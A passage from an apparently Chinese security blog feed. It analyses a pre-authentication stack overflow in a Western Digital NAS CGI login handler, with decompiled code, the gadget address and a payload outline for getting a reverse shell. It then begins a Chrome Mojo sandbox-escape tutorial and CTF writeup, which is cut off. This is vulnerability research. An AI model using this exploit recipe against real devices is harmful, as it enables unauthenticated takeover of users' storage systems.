class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v8; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v11; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v12; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v13; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v14; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v15; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// rsi</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+0h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  cgiFormString(<span class="string">"cmd"</span>, &amp;v18, <span class="number">32L</span>L);</span><br><span class="line">  v0 = <span class="built_in">memcmp</span>(&amp;v18, <span class="string">"wd_login"</span>, <span class="number">9u</span>LL) == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    wd_login();</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">"ui_check_wto"</span>;</span><br><span class="line">    v2 = <span class="number">13L</span>L;</span><br><span class="line">    v3 = &amp;v18;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v0 = *v3++ == *v1++;</span><br><span class="line">      --v2;</span><br></pre></td></tr></table></figure><h3 id="wd-login"><a href="#wd-login" class="headerlink" title="wd_login"></a>wd_login</h3><p>在我简单的处理了一下符号之后的伪代码如下。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wd_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *pos_dbl_slash; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> login_successful; <span class="comment">// er15</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v8; <span class="comment">// zf</span></span><br><span class="line">  __int64 v9; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> *v10; <span class="comment">// rsi</span></span><br><span class="line">  FILE *v11; <span class="comment">// rax</span></span><br><span class="line">  FILE *v12; <span class="comment">// r13</span></span><br><span class="line">  __int64 v13; <span class="comment">// r12</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v15; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// er12</span></span><br><span class="line">  FILE *v17; <span class="comment">// rax</span></span><br><span class="line">  FILE *v18; <span class="comment">// r12</span></span><br><span class="line">  _BOOL4 v19; <span class="comment">// ST10_4</span></span><br><span class="line">  _BOOL4 v20; <span class="comment">// ST08_4</span></span><br><span class="line">  FILE *v21; <span class="comment">// rbp</span></span><br><span class="line">  _BOOL4 v22; <span class="comment">// er8</span></span><br><span class="line">  _BOOL4 v23; <span class="comment">// er9</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">v24</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v25; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v26; <span class="comment">// rdx</span></span><br><span class="line">  FILE *v27; <span class="comment">// rbp</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">v28</span>;</span> <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// er14</span></span><br><span class="line">  FILE *v30; <span class="comment">// r12</span></span><br><span class="line">  FILE *v31; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">time_t</span> v33; <span class="comment">// [rsp+8h] [rbp-1200h]</span></span><br><span class="line">  _BOOL4 v34; <span class="comment">// [rsp+8h] [rbp-1200h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+10h] [rbp-11F8h]</span></span><br><span class="line">  _BOOL4 v36; <span class="comment">// [rsp+10h] [rbp-11F8h]</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+18h] [rbp-11F0h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+20h] [rbp-11E8h]</span></span><br><span class="line">  __int64 v39; <span class="comment">// [rsp+28h] [rbp-11E0h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-11D8h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-11C8h]</span></span><br><span class="line">  <span class="keyword">char</span> username[<span class="number">8</span>]; <span class="comment">// [rsp+50h] [rbp-11B8h]</span></span><br><span class="line">  __int64 v43; <span class="comment">// [rsp+58h] [rbp-11B0h]</span></span><br><span class="line">  __int64 v44; <span class="comment">// [rsp+60h] [rbp-11A8h]</span></span><br><span class="line">  __int64 v45; <span class="comment">// [rsp+68h] [rbp-11A0h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp+70h] [rbp-1198h]</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp+78h] [rbp-1190h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp+80h] [rbp-1188h]</span></span><br><span class="line">  __int64 v49; <span class="comment">// [rsp+88h] [rbp-1180h]</span></span><br><span class="line">  <span class="keyword">char</span> pwd_decoded[<span class="number">64</span>]; <span class="comment">// [rsp+90h] [rbp-1178h]</span></span><br><span class="line">  <span class="keyword">char</span> pwd_b64[<span class="number">256</span>]; <span class="comment">// [rsp+D0h] [rbp-1138h]</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// [rsp+1D0h] [rbp-1038h]</span></span><br><span class="line">  <span class="keyword">int</span> v53; <span class="comment">// [rsp+260h] [rbp-FA8h]</span></span><br><span class="line">  <span class="keyword">char</span> v54; <span class="comment">// [rsp+264h] [rbp-FA4h]</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// [rsp+3CFh] [rbp-E39h]</span></span><br><span class="line">  <span class="keyword">char</span> v56; <span class="comment">// [rsp+3D0h] [rbp-E38h]</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// [rsp+5CFh] [rbp-C39h]</span></span><br><span class="line">  <span class="keyword">char</span> v58; <span class="comment">// [rsp+5D0h] [rbp-C38h]</span></span><br><span class="line">  <span class="keyword">char</span> v59; <span class="comment">// [rsp+7CFh] [rbp-A39h]</span></span><br><span class="line">  <span class="keyword">char</span> v60; <span class="comment">// [rsp+7D0h] [rbp-A38h]</span></span><br><span class="line">  <span class="keyword">char</span> v61; <span class="comment">// [rsp+9D0h] [rbp-838h]</span></span><br><span class="line">  <span class="keyword">char</span> v62; <span class="comment">// [rsp+BD0h] [rbp-638h]</span></span><br><span class="line">  <span class="keyword">char</span> v63; <span class="comment">// [rsp+DCFh] [rbp-439h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+DD0h] [rbp-438h]</span></span><br><span class="line">  <span class="keyword">char</span> v65; <span class="comment">// [rsp+FCFh] [rbp-239h]</span></span><br><span class="line">  <span class="keyword">char</span> v66; <span class="comment">// [rsp+FD0h] [rbp-238h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(pwd_b64, <span class="number">0</span>, <span class="keyword">sizeof</span>(pwd_b64));</span><br><span class="line">  <span class="built_in">memset</span>(pwd_decoded, <span class="number">0</span>, <span class="keyword">sizeof</span>(pwd_decoded));</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v52, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v56, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v58, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  *(_QWORD *)username = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v60, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v61, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v62, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v66, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  v43 = <span class="number">0L</span>L;</span><br><span class="line">  v44 = <span class="number">0L</span>L;</span><br><span class="line">  v45 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)src = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)dest = <span class="number">0L</span>L;</span><br><span class="line">  v46 = <span class="number">0L</span>L;</span><br><span class="line">  v47 = <span class="number">0L</span>L;</span><br><span class="line">  v48 = <span class="number">0L</span>L;</span><br><span class="line">  v49 = <span class="number">0L</span>L;</span><br><span class="line">  v33 = time(<span class="number">0L</span>L);</span><br><span class="line">  cgiFormString(<span class="string">"username"</span>, username, <span class="number">32L</span>L);</span><br><span class="line">  cgiFormString(<span class="string">"pwd"</span>, pwd_b64, <span class="number">256L</span>L);</span><br><span class="line">  base64decode((u_char *)pwd_decoded, pwd_b64, <span class="number">256</span>);</span><br><span class="line">  pos_dbl_slash = index(username, <span class="string">'\\'</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !pos_dbl_slash )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)is_username_allowed(username) )</span><br><span class="line">    &#123;</span><br><span class="line">      login_successful = check_login(username, pwd_decoded);</span><br><span class="line">      v15 = <span class="number">0</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>首先读取用户输入的username到username数组里，最大读取32个字节，读取pwd到pwd_b64数组里，最大读取256个字节</li><li>base64decode解密pwd_b64，将结果保存在pwd_decoded数组里，最大写入256个字节，但问题是pwd_decoded数组的size是64字节，所以会越界写入到pwd_b64数组里，但在这里不会影响程序的逻辑，因为pwd_b64在解密后就不会被用到。</li><li><code>is_username_allowed</code>校验输入的用户名是否合法，该函数先将用户名里的大写字母转成小写，然后和一个全局字符串数组里的每个字符串比较，如果有任何一个匹配就返回0，代表非法，否则返回1，代表合法。<ul><li>之所以这样比较是因为它将所有注册的用户的账号密码都写入到了<code>/etc/shadow</code>文件里，而这个文件里的<code>root, anonymous...</code>等用户是linux系统使用的，而不是给注册用户使用的。</li></ul></li><li>然后将被溢出的数组pwd_decoded传给check_login函数。</li></ul><h3 id="check-login"><a href="#check-login" class="headerlink" title="check_login"></a>check_login</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check_login</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *username, <span class="keyword">const</span> <span class="keyword">char</span> *pwd_decoded)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v2; <span class="comment">// rbp</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">v3</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">v4</span>;</span> <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> password_copy_shadow[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-C8h]</span></span><br><span class="line">  <span class="keyword">char</span> password_copy_input[<span class="number">88</span>]; <span class="comment">// [rsp+50h] [rbp-78h]</span></span><br><span class="line"></span><br><span class="line">  v2 = fopen64(<span class="string">"/etc/shadow"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fgetpwent(v2);</span><br><span class="line">    v4 = v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3-&gt;pw_name, username) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(password_copy_shadow, v4-&gt;pw_passwd);</span><br><span class="line">      fclose(v2);</span><br><span class="line">      <span class="built_in">strcpy</span>(password_copy_input, pwd_decoded);</span><br></pre></td></tr></table></figure><ul><li>按行读取<code>/etc/shadow</code>里的数据，并解析成passwd结构体。</li><li>拷贝pw_passwd字段到栈上变量password_copy_shadow数组里</li><li>拷贝pwd_decoded到栈上变量password_copy_input数组里，因为pwd_decoded是一个写入溢出的字符串，其长度最大是192字节(base64算法，最大解密出来就是输入字符串的3/4长度)，而password_copy_input数组的size是88，所以在这个栈布局里就可以溢出到返回地址了。</li></ul><p>如下是ida的stack layout视图，r代表返回地址，如图可以看到从password_copy_input数组到返回地址，一共是120个字节，而我们可以写入192个字节，所以可以劫持返回地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-00000000000000C8 ; D&#x2F;A&#x2F;*   : change type (data&#x2F;ascii&#x2F;array)</span><br><span class="line">-00000000000000C8 ; N       : rename</span><br><span class="line">-00000000000000C8 ; U       : undefine</span><br><span class="line">-00000000000000C8 ; Use data definition commands to create local variables and function arguments.</span><br><span class="line">-00000000000000C8 ; Two special fields &quot; r&quot; and &quot; s&quot; represent return address and saved registers.</span><br><span class="line">-00000000000000C8 ; Frame size: C8; Saved regs: 0; Purge: 0</span><br><span class="line">-00000000000000C8 ;</span><br><span class="line">-00000000000000C8</span><br><span class="line">-00000000000000C8 password_copy_shadow db 80 dup(?)</span><br><span class="line">-0000000000000078 password_copy_input db 120 dup(?)</span><br><span class="line">+0000000000000000  r              db 8 dup(?)</span><br><span class="line">+0000000000000008</span><br><span class="line">+0000000000000008 ; end of stack variables</span><br></pre></td></tr></table></figure><h2 id="漏洞模式"><a href="#漏洞模式" class="headerlink" title="漏洞模式"></a>漏洞模式</h2><p>这个漏洞的模式就是写入的数据超出了数组本身的大小导致的写入越界，但实际造成栈溢出的地方是在更后面的strcpy的地方，相对来说其实比较隐蔽，strcpy这个函数会从源地址向目的地址拷贝数据，一直到遇到<code>\0</code>停止。</p><p>正常来说在往字符数组写入一个字符串的时候，都会把最后一个字节设置<code>\0</code>，但因为写入的越界，导致<code>\0</code>出现在了数组越界后的位置。</p><p>最终导致前面base64decode函数造成的写入越界向后传播，最终在某次strcpy的时候造成了栈溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>正常来说栈溢出的漏洞利用只需要rop构造gadaget即可，但是对于64位架构的栈溢出来说，因为程序的装载基地址是0x400000，所以不考虑return to libc等情况，直接在程序体内来找合适的gadaget地址的话，不可避免的在写入地址的时候会遇到<code>\x00</code>，比如<code>0000000000401D00</code>这个地址，它的高位都是0。</p><p>所以在strcpy的时候，遇到高位的<code>\x00</code>就会被截断，所以在溢出的时候，最多就只能覆盖到返回地址，写入一个想到劫持到的地址，不能向后继续写入了。</p><p>如图可以看出，尽管我们溢出<code>password_copy_input</code>由于截断只能写到返回地址那个位置，进行一次gadaget。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2021-01-31-083055.jpg" alt=""></p><p>但是我们可以寻找<code>lea rsp, [rsp+??] ; retn</code>这样的gadaget来抬升栈，通过stack pivot来将rsp指到<code>wd_login</code>栈上的pwd_decoded字符串里，而这个字符串的值显然是我们可以任意控制，并且不受<code>\x00</code>截断影响，它是base64解出来的。</p><p>所以到这里我们就可以进行多次gadaget了。</p><p>即我们要让pwd_decoded字符串里的内容形如，即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAA * ? + p64(gadaget_addr1) + 需要的pop的寄存器值 + p64(gadaget_addr2) + 需要的pop的寄存器值 + p64(gadaget_addr3)...</span><br></pre></td></tr></table></figure><p>然后由于一般的cgi程序里其实都会调很多system函数，所以我们只要再通过多次gadaget传递我们需要的命令到调用system函数的地方，最终执行该代码就可以反弹shell了。</p><p>但这个cgi程序里有个非常有趣的地方，就是<code>00000000004039B7</code>这个地址，它既有栈抬升，又有call system。</p><p>所以我们需要的payload就是<code>A * 120 + p64(0x4039B7) + system_cmd_str</code>即可。</p><p>解释一下，在溢出覆盖返回地址后，会跳到<code>00000000004039B7</code>去call一次无效的system命令，然后<code>lea rsp, [rsp+108h]</code>栈抬升，此时rsp指向我们在pwd_decoded里的<code>p64(0x4039B7) + system_cmd_str</code>字符串。</p><p>然后再retn，弹出p64返回地址，再次跳回到<code>00000000004039B7</code>执行，此时rsp指向的就是要执行的反弹shell字符串，并传给rdi，作为system的参数执行，此时就成功的反弹shell了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004039B</span>7                 lea     rdi, [rsp]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004039B</span>B                 call    _system</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004039</span>C0                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004039</span>C2                 lea     rsp, [rsp+<span class="number">108</span>h]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">00000000004039</span>CA                 retn</span><br></pre></td></tr></table></figure><p>具体的调试就留给读者权做练习了。</p><p>总结一下，iot的栈溢出，找gadaget的要点就是</p><ul><li>栈抬升<ul><li><code>lea rsp, [rsp+?]</code></li></ul></li><li>找system，传参劫持过去。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/" target="_blank" rel="noopener">https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sakuraの从零开始のIoT漏洞挖掘系列-一-Western-Digital-My-Cloud-Pro系列PR4100-NAS认证前RCE漏洞分析与利用&quot;&gt;&lt;a href=&quot;#sakuraの从零开始のIoT漏洞挖掘系列-一-Western-Digital-My-
      
    
    </summary>
    
    
      <category term="IoT" scheme="http://eternalsakura13.com/categories/IoT/"/>
    
    
      <category term="iot" scheme="http://eternalsakura13.com/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>chrome sandbox escape case study and plaidctf2020 mojo writeup</title>
    <link href="http://eternalsakura13.com/2020/09/20/mojo/"/>
    <id>http://eternalsakura13.com/2020/09/20/mojo/</id>
    <published>2020-09-20T15:18:59.687Z</published>
    <updated>2021-05-08T07:55:05.932Z</updated>
    
    <content type="html"><![CDATA[<h1 id="chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup"><a href="#chrome-sandbox-escape-case-study-and-plaidctf2020-mojo-writeup" class="headerlink" title="chrome sandbox escape case study and plaidctf2020 mojo writeup"></a>chrome sandbox escape case study and plaidctf2020 mojo writeup</h1><h2 id="mojo"><a href="#mojo" class="headerlink" title="mojo"></a>mojo</h2><h3 id="Intro-to-Mojo-amp-Services"><a href="#Intro-to-Mojo-amp-Services" class="headerlink" title="Intro to Mojo &amp; Services"></a>Intro to Mojo &amp; Services</h3><h4 id="mojo术语"><a href="#mojo术语" class="headerlink" title="mojo术语"></a>mojo术语</h4><p>message pipe是一对endpoints，对应通信的两端，每个endpoint保存一个传入消息队列，并且在一端写入消息可以有效地传送到另一端，因此message pipe是双向的。<br>一个mojom文件描述一组interfaces，其代表的是强类型的消息集合。<br>给定一个mojom接口和一条message pipe，可以将其中一端指定为Remote，用来发送该接口描述的消息，另一端指定为Recevier，用来接收接口的消息。<br>注意:上面的概括有点过于简化。请记住，消息管道仍然是双向的，mojom message有可能期望得到response，response是从Receiver端点发送的，并由Remote接收。<br>Receiver端必须和mojom接口的具体实现(implementation)相绑定，从而将收到的消息分发给对应的接口实现函数。</p><h4 id="定义一个新的Frame-Interface"><a href="#定义一个新的Frame-Interface" class="headerlink" title="定义一个新的Frame Interface"></a>定义一个新的Frame Interface</h4><p>假设我们想从render frame向其对应在browser进程里的RenderFrameHostImpl发送一个“Ping”消息，我们需要去定义一个mojom interface，创建一个pipe去使用这个interface，然后绑定好pipe的两端以发送和接收消息。</p><h5 id="定义一个interface"><a href="#定义一个interface" class="headerlink" title="定义一个interface"></a>定义一个interface</h5><p>第一步是去创建一个.mojom文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; src&#x2F;example&#x2F;public&#x2F;mojom&#x2F;ping_responder.mojom</span><br><span class="line">module example.mojom;</span><br><span class="line"></span><br><span class="line">interface PingResponder &#123;</span><br><span class="line">  &#x2F;&#x2F; Receives a &quot;Ping&quot; and responds with a random integer.</span><br><span class="line">  Ping() &#x3D;&gt; (int32 random);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对应创建一个build rule去生成c++ bindings</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># src&#x2F;example&#x2F;public&#x2F;mojom&#x2F;BUILD.gn</span><br><span class="line">import(&quot;&#x2F;&#x2F;mojo&#x2F;public&#x2F;tools&#x2F;bindings&#x2F;mojom.gni&quot;)</span><br><span class="line">mojom(&quot;mojom&quot;) &#123;</span><br><span class="line">  sources &#x3D; [ &quot;ping_responder.mojom&quot; ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建pipe"><a href="#创建pipe" class="headerlink" title="创建pipe"></a>创建pipe</h5><p>现在，让我们创建一个消息管道以使用此接口。通常，为了方便起见，在使用Mojo时，接口的client（即remote）通常是创建新pipe的一方。这很方便，因为可以使用Remote来立即发送消息，而无需等待InterfaceRequest端点被绑定到任何地方。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/third_party/blink/example/public/ping_responder.h</span></span><br><span class="line">mojo::Remote&lt;example::mojom::PingResponder&gt; ping_responder;</span><br><span class="line">mojo::PendingReceiver&lt;example::mojom::PingResponder&gt; receiver =</span><br><span class="line">    ping_responder.BindNewPipeAndPassReceiver();</span><br></pre></td></tr></table></figure><p>在此示例中，ping_responder是Remote，并且receiver是PendingReceiver，这是Receiver的前身。BindNewPipeAndPassReceiver是创建消息管道的最常见方法:它产生PendingReceiver作为返回值。<br>注意：一个PendingReceiver实际上不执行任何操作。它是单个消息管道端点的惰性持有者。它的存在只是为了使其端点在编译时具有更强的类型，这表明该端点希望被绑定到具体的接口类型。</p><h5 id="发送message"><a href="#发送message" class="headerlink" title="发送message"></a>发送message</h5><p>最后，我们可以通过Remote调用我们的Ping()方法来发送消息：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/third_party/blink/example/public/ping_responder.h</span></span><br><span class="line">ping_responder-&gt;Ping(base::BindOnce(&amp;OnPong));</span><br></pre></td></tr></table></figure><p>重要说明：如果我们想接收response，则必须保持ping_responder对象处于活动状态直到OnPong被调用。毕竟，ping_responder拥有消息管道端点。如果它被销毁了，那么端点也将被销毁，将没有任何东西可以接收到响应消息。<br>我们快完成了！当然，如果一切都这么简单，那么该文档就不需要存在。我们已经解决了将消息从render进程发送到browser进程的难题，并将其转化为一个问题:<br>我们只要把上面的receiver object传递给browser进程，就可以让receiver来分发它收到的消息到具体的实现函数里。</p><h5 id="发送PendingReceiver给Browser"><a href="#发送PendingReceiver给Browser" class="headerlink" title="发送PendingReceiver给Browser"></a>发送PendingReceiver给Browser</h5><p>值得注意的是，PendingReceivers（通常是消息管道端点）也是可以通过mojom消息自由发送的一种对象，将PendingReceiver放置在某处的最常见方法是将其作为方法参数传递给其他已经连接的接口。<br>将render里的RenderFrameImpl和其对应的RenderFrameHostImpl连接的interface是BrowserInterfaceBroker<br>这个interface是用来获取其他interface的factory，它的GetInterface方法接收一个GenericPendingReceiver（GenericPendingReceiver允许传递任意的interface receiver）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface BrowserInterfaceBroker 